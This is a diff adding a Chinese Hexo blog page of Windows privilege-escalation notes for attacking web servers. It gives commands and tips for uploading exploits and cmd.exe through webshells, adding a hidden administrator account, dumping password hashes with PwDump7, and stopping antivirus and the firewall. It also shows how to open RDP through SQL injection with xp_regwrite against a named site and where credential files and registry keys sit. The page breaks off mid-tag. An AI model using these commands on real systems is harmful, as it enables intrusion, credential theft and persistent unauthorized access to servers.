@@ -1,0 +1,2008 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>提权学习笔记收录 | Hexo</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://unpkg.com/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+  
+  <!-- 预加载动画 -->
+  
+  
+  <div class="preloader_6" id="loader">
+  <div class="loader"></div>
+</div>
+  <script>
+    var endLoading = function () {
+      document.body.style.overflow = 'auto';
+      document.getElementById('loader').classList.add("loaded");
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+  </script>
+
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script defer>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">Hexo</h3>
+      <h5 class="drawer-box-head_desc"></h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/16778738">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Hexo</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">Search</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="Please enter keywords"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/16778738" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+<!-- prismjs 代码高亮 -->
+
+
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://pica.zhimg.com/80/v2-573ac3e25de03fad9c32add5a05e5cfc_1440w.webp')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        提权学习笔记收录
+      </span>
+    </div>
+    
+    
+      
+        <span class="post-detail-header_date">
+          <i class="fas fa-calendar"></i> Published in：2024-02-26 |
+        </span>
+      
+
+      
+        <span class="post-detail-header_categories">
+          <i class="iconfont iconbookmark1"></i> category：
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-detail-header_category">
+              渗透测试
+            </a>
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/" class="post-detail-header_category">
+              后渗透
+            </a>
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/" class="post-detail-header_category">
+              msf
+            </a>
+          
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%90%8E%E6%B8%97%E9%80%8F/msf/%E6%8F%90%E6%9D%83/" class="post-detail-header_category">
+              提权
+            </a>
+          
+        </span>
+      
+
+      
+    
+  </div>
+  
+  
+    <script defer src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h1 id="web提权"><a href="#web提权" class="headerlink" title="web提权"></a>web提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1.能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行/c c:windowstempcookiesnet1.exe user</span><br><span class="line"></span><br><span class="line">2.当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</span><br><span class="line"></span><br><span class="line">3.cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe/cmd.com/cmd.txt 都可以。</span><br><span class="line"></span><br><span class="line">4.cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</span><br><span class="line"></span><br><span class="line">6.c:windowstempcookies 这个目录</span><br><span class="line"></span><br><span class="line">7.找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</span><br><span class="line"></span><br><span class="line">8.cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括/c )输入”net user jianmei daxia /add”</span><br><span class="line"></span><br><span class="line">9.增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</span><br><span class="line"></span><br><span class="line">10.有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</span><br><span class="line"></span><br><span class="line">11.有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</span><br><span class="line"></span><br><span class="line">12.其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</span><br><span class="line"></span><br><span class="line">13.用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</span><br><span class="line"></span><br><span class="line">14.提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</span><br><span class="line"></span><br><span class="line">15. 当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录</span><br><span class="line">然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</span><br><span class="line"></span><br><span class="line">16.有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</span><br><span class="line"></span><br><span class="line">17.进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</span><br><span class="line"></span><br><span class="line">18.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</span><br><span class="line"></span><br><span class="line">19.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</span><br><span class="line"></span><br><span class="line">20.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:windowstempcookiesPwDump7.exe &gt;1.txt</span><br><span class="line"></span><br><span class="line">21.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe</span><br><span class="line"></span><br><span class="line">22.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。</span><br><span class="line">上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:windowstempcookiescscript.exe” d:webiispwd.vbs</span><br><span class="line"></span><br><span class="line">23.如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x</span><br></pre></td></tr></table></figure>
+
+<h1 id="dos命令大全"><a href="#dos命令大全" class="headerlink" title="dos命令大全"></a>dos命令大全</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">查看版本：ver</span><br><span class="line"></span><br><span class="line">查看权限：whoami</span><br><span class="line"></span><br><span class="line">查看配置：systeminfo</span><br><span class="line"></span><br><span class="line">查看用户：net user</span><br><span class="line"></span><br><span class="line">查看进程：tasklist</span><br><span class="line"></span><br><span class="line">查看正在运行的服务：tasklist /svc</span><br><span class="line"></span><br><span class="line">查看开放的所有端口：netstat -ano</span><br><span class="line"></span><br><span class="line">查询管理用户名：query user</span><br><span class="line"></span><br><span class="line">查看搭建环境：ftp 127.0.0.1</span><br><span class="line"></span><br><span class="line">查看指定服务的路径：sc qc Mysql</span><br><span class="line"></span><br><span class="line">添加一个用户：net user jianmei daxia.asd /add</span><br><span class="line"></span><br><span class="line">提升到管理权限：net localgroup administrators jianmei /add</span><br><span class="line"></span><br><span class="line">添加用户并提升权限：net user jianmei daxia.asd /add &amp; net localgroup administrators jianmei /add</span><br><span class="line"></span><br><span class="line">查看制定用户信息：net user jianmei</span><br><span class="line"></span><br><span class="line">查看所有管理权限的用户：net localgroup administrators</span><br><span class="line"></span><br><span class="line">加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei /add</span><br><span class="line"></span><br><span class="line">突破最大连接数：mstsc /admin /v:127.0.0.1</span><br><span class="line"></span><br><span class="line">删除用户：net user jianmei /del</span><br><span class="line"></span><br><span class="line">删除管理员账户:net user administrator daxia.asd</span><br><span class="line"></span><br><span class="line">更改系统登陆密码：net password daxia.asd</span><br><span class="line"></span><br><span class="line">激活GUEST用户：net user guest /active:yes</span><br><span class="line"></span><br><span class="line">开启TELNET服务：net start telnet</span><br><span class="line"></span><br><span class="line">关闭麦咖啡：net stop “McAfee McShield”</span><br><span class="line"></span><br><span class="line">关闭防火墙：net stop sharedaccess</span><br><span class="line"></span><br><span class="line">查看当前目录的所有文件：dir c:windows</span><br><span class="line"></span><br><span class="line">查看制定文件的内容：type c:windows1.asp</span><br><span class="line"></span><br><span class="line">把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：</span><br><span class="line"></span><br><span class="line">copy c:windowstempcookiescmd.exe c:windowstempcmd.txt</span><br><span class="line"></span><br><span class="line">开3389端口的命令：</span><br><span class="line"></span><br><span class="line">REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line">查 看补丁：</span><br><span class="line"></span><br><span class="line">dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find /i “%i”||@echo %i Not Installed!)&amp;del /f /q /a a.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="SQL语句直接开启3389"><a href="#SQL语句直接开启3389" class="headerlink" title="SQL语句直接开启3389"></a>SQL语句直接开启3389</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">3389登陆关键注册表位置：</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections</span><br><span class="line"></span><br><span class="line">其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</span><br><span class="line"></span><br><span class="line">而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">开启3389的SQL语句：</span><br><span class="line"></span><br><span class="line">syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">关闭3389的SQL语句：</span><br><span class="line"></span><br><span class="line">syue.com/xiaohua.asp?id=100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server ’,’fDenyTSConnections’,’REG_DWORD’,1;–</span><br></pre></td></tr></table></figure>
+
+<h1 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a>常见杀软</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">360tray.exe 360实时保护</span><br><span class="line"></span><br><span class="line">ZhuDongFangYu.exe 360主动防御</span><br><span class="line"></span><br><span class="line">KSafeTray.exe 金山卫士</span><br><span class="line"></span><br><span class="line">McAfee McShield.exe 麦咖啡</span><br><span class="line"></span><br><span class="line">SafeDogUpdateCenter.exe 服务器安全狗</span><br></pre></td></tr></table></figure>
+
+<h1 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="headerlink" title="windows提权中敏感目录和敏感注册表的利用"></a>windows提权中敏感目录和敏感注册表的利用</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">敏感目录 目录权限 提权用途</span><br><span class="line"></span><br><span class="line">C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件</span><br><span class="line">C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径</span><br><span class="line">C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及exp</span><br><span class="line">C:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及exp</span><br><span class="line">C:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件</span><br><span class="line">C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码</span><br><span class="line">C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。</span><br><span class="line">C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及exp</span><br><span class="line">C:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限</span><br><span class="line">C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码</span><br><span class="line">C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权</span><br><span class="line">C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权</span><br><span class="line">C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码</span><br><span class="line">c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码</span><br><span class="line">c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件</span><br><span class="line">C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置</span><br><span class="line">C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="headerlink" title="**提权中的敏感注册表位置 **"></a>**提权中的敏感注册表位置 **</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口</span><br><span class="line">HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESOFTWAREMySQL AB mssql的注册表位置</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值</span><br><span class="line">HKEY<span class="emphasis">_CURRENT_</span>USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码</span><br><span class="line">HKEY<span class="emphasis">_LOCAL_</span>MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密</span><br><span class="line">HKEY<span 